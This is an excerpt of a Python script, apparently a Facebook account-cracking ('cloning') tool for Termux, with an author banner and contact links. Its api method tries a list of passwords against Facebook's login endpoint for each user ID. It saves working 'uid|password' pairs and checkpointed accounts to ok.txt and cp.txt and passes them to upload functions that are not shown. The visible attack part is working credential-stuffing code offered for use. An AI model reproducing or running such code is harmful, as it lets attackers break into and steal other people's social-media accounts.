...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/musa.khan.39545"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/musa.khan.39545")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> Muhammad moshin")
	subprocess.check_output(["am", "start", "https://www.facebook.com/musa.khan.39545"])
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            Muhammad moshin
     \033[1;91m➣ \033[1;92mFACEBOOK   :            Muhammad moshin
     \033[1;93m➣ \033[1;92mWHATSAPP   :            92303
     \033[1;96m➣ \033[1;92mGITHUB     :            irtazaha
...
#				exit()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [MMS] : \033[0;97m %s/%s -> \033[0;92m [MMS -OK:%s ]- \033[0;93m[MMS-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [MMS-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[MMS-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MMS-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
